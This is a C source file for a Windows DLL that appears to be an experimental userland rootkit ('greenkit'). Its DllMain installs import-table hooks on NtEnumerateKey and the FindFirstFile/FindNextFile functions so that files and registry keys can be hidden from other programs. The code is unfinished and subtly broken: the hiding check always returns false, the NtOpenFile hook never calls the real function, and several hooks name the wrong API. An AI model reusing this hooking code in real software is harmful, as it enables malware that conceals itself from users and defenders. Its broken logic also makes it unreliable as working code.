#include "stdafx.h"
#include "windefs.h"
#include "hooking.h"

#include "NtQuerySystemInformation.h"
#include "NtEnumerateKey.h"
#include "FindFiles.h"

VOID WriteFile()
{
    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    DWORD dwBytesWritten = 0;
    char Str[] = "Coucou";
    WriteFile(hFile, Str, strlen(Str), &dwBytesWritten, NULL);
}

BOOL mustHideFile(TCHAR filePath) {
    return FALSE; // TODO check la fin de la string avec des constantes
}

NTSTATUS WINAPI NewNtOpenFile(
    PHANDLE				phFile,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PIO_STATUS_BLOCK	IoStatusBlock,
    ULONG				ShareAccess,
    ULONG				OpenOptions)
{
    TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
    WriteFile();
    //if (!mustHideFile(*sPath))
    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

    return 0;//status; // STATUS_NO_SUCH_FILE
}

NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
    ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
{
    //TCHAR sPath[MAX_PATH];
    //DWORD dwRet;
    //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
    MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
    //if (!mustHideFile(*sPath))
    NTSTATUS status = ((PNT_CREATE_FILE) hooking_getOldFunction("NtCreateFile"))(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
        CreateOptions, EaBuffer, EaLength);

    return status; // STATUS_NO_SUCH_FILE
}

void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
{
#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
    DWORD dwOldProtect, dwOldProtect2;
    HMODULE hModule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNTHeader;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    void *pOldFunction;
    if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
    pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
    pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
    while (pImportDesc->Name)
    {
        char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
        if (!stricmp(szModuleName, szDllName)) break;
        pImportDesc++;
    }
    if (pImportDesc->Name == NULL) return (NULL);
    pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
    while (pThunk->u1.Function)
    {
        if (pThunk->u1.Function == (DWORD)pOldFunction)
        {
            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            pThunk->u1.Function = (DWORD)pNewFunction;
            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
            return (pOldFunction);
        }
        pThunk++;
    }
    return (NULL);
}

bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
		case DLL_PROCESS_ATTACH:
            MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
            WriteFile();
			//hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
			//hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
			hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
            hooking_addFunction("FindFirstFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA));
            hooking_addFunction("FindNextFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindNextFileA));
            hooking_addFunction("FindFirstFileW", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileW));
            hooking_addFunction("FindNextFileW", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindNextFileW));
			return TRUE;
	}
	return TRUE;
}